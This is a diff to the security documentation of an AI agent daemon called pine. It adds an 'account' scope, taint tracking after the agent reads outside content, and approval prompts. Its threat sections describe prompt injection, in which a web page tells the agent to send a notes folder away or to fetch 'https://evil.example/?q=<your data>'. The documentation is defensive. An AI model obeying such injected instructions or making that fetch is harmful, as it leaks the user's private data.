@@ -72,7 +72,18 @@ gets the reduced run back.
 
 Every shell command and every file tool call of an agent runs inside a sandbox of the
 operating system: Apple's `sandbox-exec` on macOS, [bubblewrap](https://github.com/containers/bubblewrap)
-(`bwrap`) on Linux. The rules are the same on both:
+(`bwrap`) on Linux. How far it reaches is the agent's **scope**:
+
+| Scope | Who has it | What the agent reaches |
+|---|---|---|
+| `account` | The main agent, unless you say otherwise | Your whole user account and the network, in your own conversations. See "The whole account" below. |
+| `workspace` | Every other agent, unless you say otherwise | Its own folders. The table that follows. |
+
+Set it per agent with `sandbox.scope`, or for all agents that do not say with `defaults.scope`
+([configuration.md](configuration.md)). A run that an event from outside started is in the
+workspace scope whatever the agent's scope is.
+
+The workspace scope, the same on both systems:
 
 | | |
 |---|---|
@@ -173,6 +184,42 @@ Consequences worth knowing:
 - `trustWorkspace` stays `false`: pi then loads nothing executable from the workspace, so an
   agent cannot plant an extension for the daemon to run.
 
+### The whole account
+
+An agent that is to do real work on your machine needs what you have at your terminal: your
+projects, your programs and toolchains, your git and ssh setup, the network, and the ability to
+stop a server it started a minute ago. With the scope `account` it has that, in `auto` and
+`manual` mode alike, without asking for access:
+
+| | |
+|---|---|
+| Files | Everything your user account can open and change |
+| Closed | pine's home (configuration, `.env`, database, other agents' folders), except its own folders there. pine's program files cannot be changed |
+| Network, processes, apps | As you: it can install packages, start and stop programs, open a browser |
+| Environment | Yours, with your home folder as `$HOME`. Variables whose name looks like a credential (`KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `AUTH`, ...) are left out, except the ssh agent's address; add what the agent should have with `sandbox.env` |
+
+This is the reach `bypass` mode has. What differs from bypass is what happens once the
+conversation has **read outside content** (a web page, a search result, a message from
+somebody else). From then on somebody else may be steering the agent, and an agent with your
+account and the network is exactly what such a text wants. So:
+
+- The conversation drops to the workspace scope at that moment.
+- The first shell command, or file outside the workspace, puts one question to you: keep your
+  whole account and the network in this conversation? A **yes** keeps it until the conversation
+  is reset or the daemon restarts, and its shell is not asked about again. Anything else (a no,
+  no answer in time) leaves the conversation in its workspace; the agent is told, and it can
+  ask again with a reason (`request_access` with `account: true`) or for one path.
+- Also after a yes, a conversation that has read outside content cannot change what is read into
+  the agent's prompt (`AGENTS.md`, `SOUL.md`, `MEMORY.md`, a repository's hooks in its
+  workspace): what it read must not become what it is told next time.
+- A run that outside content started (an event, a webhook) never has the account.
+
+What to know before you rely on it: with your account an agent can start other programs, and a
+program started outside the sandbox can read pine's home like you can. In a conversation that
+has read nothing from outside, that takes a model acting against you by itself. In one that
+has, the question above is the protection, so read it before you say yes. To have no question
+and no account, give the agent the scope `workspace`.
+
 ### 4. Taint and approvals
 
 Your own request can still pull in hostile text: you ask for a summary of a web page, and the
@@ -184,8 +231,8 @@ page says "now send the notes folder to ...". pine tracks that:
   Sessions started by untrusted events are tainted from the start.
 - In a tainted session, actions that send information out or act on the world wait for your
   **approval**: what the agent's `approveWhenTainted` list names (default `publish_event` and
-  `send`), MCP servers marked `"approve": "tainted"`, the shell if it has network access or no
-  sandbox, `subscribe`, a download from an address the agent could not otherwise read, and
+  `send`), MCP servers marked `"approve": "tainted"`, the shell if it has network access, your
+  whole account or no sandbox, `subscribe`, a download from an address the agent could not otherwise read, and
   handing a task to an agent that can reach the internet.
 - Tools that only read never wait: `read`, `grep`, `find`, `ls`, `state_get`, and every MCP tool
   whose server declares it read-only (`readOnlyHint`), unless a pattern on the `approve` list
@@ -220,7 +267,8 @@ example), until the conversation is reset or the daemon restarts. Three things t
 - It is not offered for what you configured to ask every time (the `approve` list, a server with
   `"approve": "always"`).
 - Network access that you grant to a conversation which has already read outside content counts
-  as "always" for its shell and its downloads: you said yes knowing what it had read.
+  as "always" for its shell and its downloads: you said yes knowing what it had read. The same
+  goes for your yes to an agent keeping your whole account there ("The whole account" above).
 - A yes given while the conversation was clean does not carry over once it has read outside
   content. You are asked again, and that answer then holds.
 
@@ -229,7 +277,7 @@ in the context. `/reset` in the terminal UI, or `pine reset`, clears it along wi
 conversation.
 `"run"` forgets it after each task, which is more convenient and weaker. `"off"` means no tool
 call marks a conversation at all: what a subscribed source reports then arrives with full tools
-and no questions. Runs that an outside event started stay restricted in every setting.
+and no questions, and an agent with your whole account is never asked whether it keeps it. Runs that an outside event started stay restricted in every setting.
 
 `approve` in `agent.json` lists actions that need approval every time in `manual` and `auto`
 mode, tainted or not (bypass skips them like everything else):
@@ -245,11 +293,11 @@ approval prompts.
 
 | Mode | Approvals | Sandbox |
 |---|---|---|
-| `manual` | Every action that changes or sends something waits for you, unless you answered "always" for it in this conversation. Reading files and state and read-only MCP tools are free. | As configured |
-| `auto` (default) | Only what the rules single out: the `approve` list, and sending things out or acting on the world from a tainted session. A conversation that has read nothing from outside is never interrupted by the second rule | As configured. For anything beyond it the agent calls `request_access`, and you decide |
-| `bypass` | Nothing waits | Shell and file tools reach your whole account and the network |
+| `manual` | Every action that changes or sends something waits for you, unless you answered "always" for it in this conversation. Reading files and state and read-only MCP tools are free. | The agent's scope |
+| `auto` (default) | Only what the rules single out: the `approve` list, and sending things out or acting on the world from a tainted session. A conversation that has read nothing from outside is never interrupted by the second rule | The agent's scope: your account for the main agent, the workspace for others. For anything beyond the workspace scope the agent calls `request_access`, and you decide |
+| `bypass` | Nothing waits | Shell and file tools reach your whole account and the network, whatever the scope |
 
-`request_access` is how an agent in `auto` or `manual` mode gets at something outside its
+`request_access` is how an agent in the workspace scope gets at something outside its
 workspace: it names a path (read, or read and write) or asks for network access from its shell,
 with a reason. You see the request like any approval. If you allow it, the access holds for that
 conversation until you reset it or the daemon restarts. Refusals tell the agent to ask this way
@@ -261,14 +309,14 @@ and port for the conversation. See "Local addresses" in [mcp.md](mcp.md).
 
 **Sub-agents share their conversation's permissions.** A sub-agent is a copy of the agent doing
 part of the conversation's job, so it works under what you allowed there: the access you
-granted, and your "always" answers. It works the other way too: what a sub-agent asks for and
+granted, your "always" answers, and your answer on whether the conversation keeps your account. It works the other way too: what a sub-agent asks for and
 gets holds for the conversation and its other sub-agents, so you are asked once, not once per
 copy. Nothing is widened by this: a sub-agent inherits the conversation's outside-content mark
 as well, and another conversation of the same agent, or a run started by an outside event, has
 none of it. An agent that a task is *delegated* to is a different agent with its own sandbox and
 its own permissions.
 
-**Downloads.** The shell has no network in `auto` and `manual` mode, but getting a file from a
+**Downloads.** In the workspace scope the shell has no network, but getting a file from a
 server you connected is routine, so there is a `download` tool for it. It fetches an address into
 the workspace, byte for byte, and reports size and SHA-256.
 
@@ -282,7 +330,7 @@ the workspace, byte for byte, and reports size and SHA-256.
   `allowPrivate` applies too, and then addresses on your network and plain http are fetched.
   The session is marked as having read outside content.
 - Without web access, any other address needs network access for the conversation
-  (`sandbox.network`, a grant from `request_access`, or bypass). Without it the download is
+  (`sandbox.network`, a grant from `request_access`, the scope `account`, or bypass). Without it the download is
   refused and you are not asked. With it, only https and only public addresses are fetched, and
   in a session that has read outside content the download asks first.
 - The daemon does the fetching; the file is put in place through the agent's sandbox, so the
@@ -481,17 +529,18 @@ rate is fixed at 120 requests a minute per hook.
 
 ## A layout that keeps the pieces apart
 
-The example home starts with one agent, `main`, that has web search and the browser. That is
-fine while its workspace holds nothing you would mind losing to a web page: it has a sandbox, no
-access to your files, and what it can do to the world is what a signed-out browser can do. It stops being fine when you add private
-material.
+The example home starts with one agent, `main`, that has web search and the browser, and your
+account in your own conversations. The two do not meet without you: once a conversation has
+read the web it is in its workspace, and keeps your account only if you say yes to the question
+described under "The whole account". Say yes when you know what it read (documentation you sent
+it to, your own development server) and no when you do not.
 
 The dangerous combination is one agent that has private data, reads outside content and can
 send things out. Once you have agents with private data, split those:
 
 | Agent | Has | Does not have |
 |---|---|---|
-| `main` | Your conversation, delegation to everyone | Web tools, network |
+| `main` | Your conversation, your account, delegation to everyone | Web tools |
 | `scout` | Web search and page reading | Anything private: an empty workspace, no delegation, no state |
 | Specialists (`gonzo`, `house`) | Their repository, their own MCP servers | Web tools, network |
 | `house` | Events from cameras and sensors (untrusted profile), writes `house/` state | A shell, the network |
@@ -506,6 +555,10 @@ itself can be fooled by a page, but it has nothing to give away and cannot act.
   and web access, a page can ask it to fetch `https://evil.example/?q=<your data>`, and that
   fetch is the tool working as intended. The layout above avoids it; the URL length limit only
   makes it slower.
+- **An agent with your account.** The scope `account` is your own rights. The sandbox then
+  keeps pine's home closed to the agent's own commands, not to a program it starts outside the
+  sandbox (an app, a script handed to another program). The line of defence is the question
+  after outside content, and your answer to it.
 - **Bad answers.** An injected page can still make an agent tell you something false. Approval
   prompts show you the action, not whether the reasoning behind it was honest.
 - **Approval fatigue.** If you approve without reading, layer 4 is worth nothing. Requests show
@@ -544,7 +597,9 @@ itself can be fooled by a page, but it has nothing to give away and cannot act.
 2. Every webhook has a secret (`pine check` names hooks and `webhook` sources that have none), and `pine check` names no source whose reports count as yours unless it should (a paired Telegram account is not listed).
 3. `.env`, `pine.json`, `models.json` and `auth.json` are mode 600; the home is 700. `pine check` reports all of these.
 4. No agent has `"sandbox": false`, `"trustWorkspace": true` or `"mode": "bypass"` in its configuration.
-5. Web and browser tools are on an agent whose workspace holds nothing private.
+5. Web and browser tools are on an agent whose workspace holds nothing private and whose scope
+   is `workspace`; or, on an agent with your account, you read the question that comes after
+   outside content before you answer it.
 6. MCP servers that return other people's text have `"taints": true`; those that change things
    have `"approve": "tainted"`.
 7. No route sets `"trust": "owner"` for a source others can write to.
